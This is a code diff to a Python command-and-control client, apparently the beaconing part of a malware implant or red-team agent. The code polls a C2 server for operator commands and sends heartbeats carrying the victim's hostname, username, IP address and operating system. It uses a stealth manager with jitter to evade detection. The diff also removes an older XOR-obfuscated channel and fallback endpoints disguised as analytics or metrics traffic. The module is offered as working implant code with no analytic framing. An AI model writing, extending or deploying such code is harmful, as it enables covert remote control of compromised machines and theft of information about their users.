@@ -10,7 +10,7 @@ import urllib3
 from urllib3.exceptions import InsecureRequestWarning
 from config import (
     C2_SERVER, C2_USER_AGENT, C2_TIMEOUT, C2_MAX_RETRIES,
-    RETRY_DELAY_MIN, RETRY_DELAY_MAX, DEBUG_MODE
+    RETRY_DELAY_MIN, RETRY_DELAY_MAX, DEBUG_MODE, AGENT_API_KEY
 )
 from core.stealth import stealth_manager
 
@@ -19,11 +19,19 @@ urllib3.disable_warnings(InsecureRequestWarning)
 
 class SecureC2Client:
     
-    def __init__(self, server_url=None, user_agent=None):
+    def __init__(self, server_url=None, user_agent=None, session_id=None):
         self.server_url = server_url or C2_SERVER
         self.user_agent = user_agent or C2_USER_AGENT
+        self.session_id = session_id or self._generate_session_id()
         self.session = self._create_session()
-        self.encryption_key = self._generate_session_key()
+        
+    def _generate_session_id(self):
+        """Generate a unique session ID for this agent instance"""
+        import hashlib
+        import uuid
+        
+        key_material = f"{uuid.getnode()}{time.time()}{random.random()}"
+        return hashlib.md5(key_material.encode()).hexdigest()[:16]
         
     def _create_session(self):
         session = requests.Session()
@@ -36,58 +44,23 @@ class SecureC2Client:
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
+            'Upgrade-Insecure-Requests': '1',
+            'X-Agent-Key': AGENT_API_KEY
         })
         
         return session
     
-    def _generate_session_key(self):
-        import hashlib
-        import uuid
-        
-        key_material = f"{uuid.getnode()}{time.time()}"
-        return hashlib.md5(key_material.encode()).hexdigest()[:16]
-    
-    def _encrypt_data(self, data):
+    def send_data(self, data, endpoint="/data"):
+        """Send data to C2 server in the format expected by the API"""
+        # Add session_id to payload
         if isinstance(data, dict):
-            data = json.dumps(data)
-        
-        encrypted = ""
-        key_len = len(self.encryption_key)
-        
-        for i, char in enumerate(data):
-            encrypted += chr(ord(char) ^ ord(self.encryption_key[i % key_len]))
-        
-        return base64.b64encode(encrypted.encode()).decode()
-    
-    def _decrypt_data(self, encrypted_data):
-        try:
-            decoded = base64.b64decode(encrypted_data).decode()
-            decrypted = ""
-            key_len = len(self.encryption_key)
-            
-            for i, char in enumerate(decoded):
-                decrypted += chr(ord(char) ^ ord(self.encryption_key[i % key_len]))
-            
-            return json.loads(decrypted)
-        except Exception:
-            return None
-    
-    def send_data(self, data, endpoint="/data", encrypt=True):
-        if encrypt:
-            payload = {
-                'encrypted': True,
-                'data': self._encrypt_data(data)
-            }
+            payload = {**data, 'sessionId': self.session_id}
         else:
-            payload = {
-                'encrypted': False,
-                'data': data
-            }
+            payload = {'sessionId': self.session_id, 'data': data}
         
         for attempt in range(C2_MAX_RETRIES):
             try:
-                # Jitter 
+                # Jitter
                 stealth_manager.add_jitter()
                 
                 response = self.session.post(
@@ -97,9 +70,13 @@ class SecureC2Client:
                 )
                 
                 if response.status_code == 200:
-                    return self._handle_response(response)
-                elif response.status_code == 404:
-                    return self._try_alternative_endpoints(payload)
+                    return response.json()
+                elif response.status_code == 401:
+                    if DEBUG_MODE:
+                        stealth_manager.safe_execute(
+                            lambda: print(f"C2 authentication failed")
+                        )
+                    return False
                     
             except requests.exceptions.RequestException as e:
                 if DEBUG_MODE:
@@ -116,75 +93,48 @@ class SecureC2Client:
         
         return False
     
-    def _handle_response(self, response):
-        try:
-            response_data = response.json()
-            
-            if response_data.get('encrypted'):
-                decrypted = self._decrypt_data(response_data.get('data', ''))
-                return decrypted
-            else:
-                return response_data.get('data')
-                
-        except Exception as e:
-            if DEBUG_MODE:
-                stealth_manager.safe_execute(
-                    lambda: print(f"Response handling failed: {e}")
-                )
-            return None
-    
-    def _try_alternative_endpoints(self, payload):
-        alternative_endpoints = [
-            "/api/upload",
-            "/submit",
-            "/log",
-            "/analytics",
-            "/metrics"
-        ]
-        
-        for endpoint in alternative_endpoints:
-            try:
-                stealth_manager.add_jitter(0.5, 2)
-                
-                response = self.session.post(
-                    f"{self.server_url}{endpoint}",
-                    json=payload,
-                    timeout=C2_TIMEOUT
-                )
-                
-                if response.status_code == 200:
-                    return self._handle_response(response)
-                    
-            except Exception:
-                continue
-        
-        return False
-    
     def receive_commands(self, endpoint="/commands"):
+        """Poll for pending commands from C2 server"""
         try:
             stealth_manager.add_jitter()
             
+            # Pass session_id as query param
+            params = {'sessionId': self.session_id}
+            
             response = self.session.get(
                 f"{self.server_url}{endpoint}",
+                params=params,
                 timeout=C2_TIMEOUT
             )
             
             if response.status_code == 200:
-                return self._handle_response(response)
-            
+                data = response.json()
+                if data.get('success') and data.get('data'):
+                    commands = data['data'].get('commands', [])
+                    return commands
+            elif response.status_code == 401:
+                if DEBUG_MODE:
+                    stealth_manager.safe_execute(
+                        lambda: print(f"Command retrieval auth failed")
+                    )
+        
         except Exception as e:
             if DEBUG_MODE:
                 stealth_manager.safe_execute(
                     lambda: print(f"Command retrieval failed: {e}")
                 )
         
-        return None
+        return []
     
     def heartbeat(self, system_info=None):
+        """Send heartbeat to C2 server"""
         heartbeat_data = {
-            'type': 'heartbeat',
-            'timestamp': time.time(),
-            'system_info': system_info or {}
+            'hostname': system_info.get('hostname') if system_info else None,
+            'username': system_info.get('username') if system_info else None,
+            'ipAddress': system_info.get('ipAddress') if system_info else None,
+            'operatingSystem': system_info.get('operatingSystem') if system_info else None,
+            'architecture': system_info.get('architecture') if system_info else None,
+            'metadata': system_info
         }
         
         return self.send_data(heartbeat_data, endpoint="/heartbeat")
